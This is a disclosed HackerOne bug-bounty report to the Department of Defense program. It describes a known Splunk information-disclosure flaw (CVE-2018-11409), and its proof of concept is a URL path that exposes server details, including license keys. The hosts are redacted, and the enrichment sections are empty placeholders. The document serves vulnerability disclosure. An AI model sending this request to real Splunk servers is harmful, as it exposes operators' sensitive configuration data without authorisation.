---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1860905'
original_report_id: '1860905'
title: Splunk Sensitive Information Disclosure @████████
weakness: Insecure Storage of Sensitive Information
team_handle: deptofdefense
created_at: '2023-02-03T07:36:53.395Z'
disclosed_at: '2023-02-13T11:58:00.323Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 27
tags:
- hackerone
- insecure-storage-of-sensitive-information
---

# Splunk Sensitive Information Disclosure @████████

## Metadata

- HackerOne Report ID: 1860905
- Weakness: Insecure Storage of Sensitive Information
- Program: deptofdefense
- Disclosed At: 2023-02-13T11:58:00.323Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Hope you are doing great.
I got a domain that contains Splunk Sensitive Information Disclosure @██████████
PoC:
https://███████/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
█████████

Splunk through 7.0.1 allows information disclosure by appending __raw/services/server/info/server-info?output_mode=json to a query, as demonstrated by discovering a license key.

Reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2018-11409
    - https://github.com/kofa2002/splunk
    - https://www.exploit-db.com/exploits/44865/
    - http://web.archive.org/web/20211208114213/https://securitytracker.com/id/1041148

## Impact

Splunk Sensitive Information Disclosure

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Open this link:
https://█████████/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
